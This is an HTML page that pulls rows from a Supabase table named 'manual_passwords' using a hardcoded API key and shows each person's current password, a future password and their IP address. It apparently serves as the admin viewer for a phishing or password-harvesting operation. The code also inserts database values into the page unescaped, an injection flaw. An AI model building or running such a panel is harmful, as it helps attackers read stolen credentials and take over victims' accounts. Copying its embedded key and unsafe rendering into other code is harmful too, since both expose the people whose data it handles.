<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>ðŸ›¡ User Credentials Dashboard</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      padding: 40px;
    }
    h2 {
      text-align: center;
      margin-bottom: 30px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      background: #fff;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    th, td {
      padding: 12px;
      border: 1px solid #ddd;
      text-align: left;
    }
    th {
      background-color: #222;
      color: white;
    }
    tr:nth-child(even) {
      background-color: #f9f9f9;
    }
  </style>
</head>
<body>

  <h2>ðŸ“‹ User Credentials Dashboard </h2>

  <table id="userTable">
    <thead>
      <tr>
        <th>ID</th>
        <th>Current Password</th>
        <th>Password they may keep in future</th>
        <th>IP</th>
        <th>Created At</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>

  <script type="module">
    const supabaseUrl = 'https://agxpaqpppnjoexgjcogl.supabase.co'; // ðŸ” Replace with your Supabase URL
    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFneHBhcXBwcG5qb2V4Z2pjb2dsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE0NTI0ODIsImV4cCI6MjA2NzAyODQ4Mn0.da2h8-NCdbEaLBUgeDwqH1-FL6ki9IZMh-wg0t5Ebl0'; // ðŸ” Replace with your Supabase anon or service key

    import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

    const supabase = createClient(supabaseUrl, supabaseKey);

    async function loadUsers() {
      const { data, error } = await supabase
        .from('manual_passwords') // Make sure this matches your exact table name
        .select('id, old_password, new_password, ip, created_at')
        .order('created_at', { ascending: false });

      console.log('DATA:', data);
      console.log('ERROR:', error);

      if (error) {
        alert('Error loading users');
        return;
      }

      const tbody = document.querySelector('#userTable tbody');
      data.forEach(user => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td>${user.id}</td>
          <td>${user.old_password || '-'}</td>
          <td>${user.new_password || '-'}</td>
          <td>${user.ip || '-'}</td>
          <td>${new Date(user.created_at).toLocaleString()}</td>
        `;
        tbody.appendChild(tr);
      });
    }

    loadUsers();
  </script>

</body>
</html>
